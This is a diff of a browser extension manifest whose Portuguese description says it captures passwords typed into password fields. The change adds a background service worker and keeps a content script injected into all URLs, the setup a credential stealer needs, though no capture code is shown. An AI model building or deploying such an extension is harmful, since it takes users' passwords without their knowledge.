@@ -4,13 +4,13 @@
   "version": "1.0",
   "description": "Captura a senha digitada em um input type password",
   "permissions": ["scripting", "activeTab"],
-  "action": {
-    "default_popup": "popup.html"
+  "background": {
+      "service_worker": "background.js"
   },
   "content_scripts": [
-    {
-      "matches": ["<all_urls>"],
-      "js": ["content.js"]
-    }
+      {
+          "matches": ["<all_urls>"],
+          "js": ["content.js"]
+      }
   ]
 }
